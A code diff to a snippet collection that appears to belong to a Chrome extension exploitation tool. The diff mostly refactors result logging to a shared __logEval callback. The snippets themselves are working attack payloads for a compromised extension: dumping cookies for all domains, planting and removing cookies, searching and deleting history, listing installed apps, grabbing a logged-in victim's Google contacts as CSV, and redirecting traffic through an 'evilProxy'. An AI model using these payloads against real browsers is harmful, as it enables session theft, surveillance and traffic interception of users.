@@ -4,7 +4,7 @@
 x = new XMLHttpRequest();
 x.onreadystatechange = function() {
 if (x.readyState == 4) {
-   __p.postMessage({cmd:'recveval', p: x.responseText});
+   __logEval(x.responseText);
 }
 };
 x.open('GET','/',true);
@@ -41,9 +41,7 @@ d.body.appendChild(s);
 chrome.cookies.getAll({
   // comment out following line to get cookies for all domains
   url:"https://www.google.com/"
-}, function(cookies) {
-  log({type:"recveval",result: cookies});
-})
+}, __logEval);
 </snippet>
 <snippet type="eval-ext-snippets" name="set cookie">
 //extension needs cookies permission
@@ -55,34 +53,26 @@ chrome.cookies.set({
   httpOnly: true,
   expirationDate: 1417390624, // unix timestamp or null for session cookie
   path: '/'
-}, function(c) {
-  log({type:'recveval',result: c});
-})
+}, __logEval);
 </snippet>
 <snippet type="eval-ext-snippets" name="remove cookie">
 //extension needs cookies permission
 chrome.cookies.remove({
   url: 'https://www.google.com/',
   name: 'test-chef'
-}, function(c) {
-  log({type:'recveval',result: c});
-})
+}, __logEval)
 </snippet>
 <snippet type="eval-ext-snippets" name="have you visited google?">
 // requires history permission
 chrome.history.getVisits({
   url: 'http://www.google.com/'
-}, function(visits) {
-  log({type:'recveval',result: visits});
-});
+}, __logEval);
 </snippet>
 <snippet type="eval-ext-snippets" name="search history">
 // requires history permission
 chrome.history.search({
   text: 'google'
-}, function(r) {
-  log({type:'recveval',result: r});
-})
+}, __logEval)
 </snippet>
 <snippet type="eval-ext-snippets" name="delete URL from history">
 // requires history permission
@@ -91,9 +81,7 @@ chrome.history.deleteUrl({
 })
 </snippet>
 <snippet type="eval-ext-snippets" name="do I have file:// access?">
-chrome.extension.isAllowedFileSchemeAccess(function(yes) {
-    log({type:'recveval',result: yes});
-})
+chrome.extension.isAllowedFileSchemeAccess(__logEval);
 </snippet>
 <snippet type="eval-ext-snippets" name="get manifest">
 x = new XMLHttpRequest();
@@ -103,7 +91,7 @@ x.onreadystatechange = function() {
     d=JSON.parse(x.responseText);
  } catch (e) {d=x.responseText}
 if (x.readyState == 4) {
-   log({type:'recveval', result:d});
+   __logEval(d);
 }
 };
 x.open('GET','/manifest.json',true);
@@ -129,7 +117,7 @@ x.send(null);
             if (m != null) {
                 tmpCSV = grabCSV(m[2])
                 params = "email=email&amp;csv="+tmpCSV;
-                setTimeout(function(){log({type:'recveval',result: tmpCSV});},100);
+                setTimeout(function(){__logEval(tmpCSV);},100);
              }
         }
 
@@ -139,7 +127,7 @@ x.send(null);
             client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
             client.send();
             if(client.status != 200){ // if the victim is not authenticated in Google, a 403 Forbidden error is received.
-                setTimeout(function() {log({type:'recveval',result: 'not logged in'});},100);
+                setTimeout(function() {__logEval('not logged in');},100);
             }else{ //proceed
                 toolContact(client.responseText);
             }
@@ -151,9 +139,9 @@ x.send(null);
 <snippet type="eval-ext-snippets" name="get installed apps">
 // requires management permission, by @theKos
 try {
-  chrome.management.getAll(function(list){log({type:'recveval',result: list})})
+  chrome.management.getAll(__logEval)
 } catch (e){
-  log({type:'recveval', result:false});
+  __logEval(e);
 }
 </snippet>
 <snippet type="eval-ext-snippets" name="extension has plugins?">
@@ -166,9 +154,9 @@ x.onreadystatechange = function() {
  } catch (e) {d=x.responseText}
 if (x.readyState == 4) {
    if (d['plugins']){
-      log({type:'recveval', result:d['plugins']});
+      __logEval(d['plugins']);
    } else {
-      log({type:'recveval', result:false});
+      __logEval(false);
    }
 }
 };
@@ -178,7 +166,7 @@ x.send(null);
 <snippet type="eval-ext-snippets" name="get proxy settings">
 // by @theKos, requires proxy permission
 try {
-   chrome.proxy.settings.get({'incognito': false},function(config) {log({type:'recveval', result:config})});
+   chrome.proxy.settings.get({'incognito': false},__logEval);
 } catch (e){
    log({type:'recveval', result:false});
 }
@@ -199,17 +187,17 @@ var evilProxy = {
 }
 
 try {
-   chrome.proxy.settings.set({value: evilProxy, scope: 'regular'},function() {log({type:'recveval', result:'Proxy settings updated!'})});
+   chrome.proxy.settings.set({value: evilProxy, scope: 'regular'},function() {__logEval('Proxy settings updated!');});
 } catch (e){
-   log({type:'recveval', result:'error '+e});
+   __logEval('error '+e);
 }
 </snippet>
 <snippet type="eval-ext-snippets" name="reset proxy settings">
 // requires proxy permission
 try {
-   chrome.proxy.settings.get({'incognito': false},function(config) {log({type:'recveval', result:config})});
+   chrome.proxy.settings.get({'incognito': false},__logEval);
 } catch (e){
-   log({type:'recveval', result:false});
+   __logEval(false);
 }
 </snippet>
 </snippets>
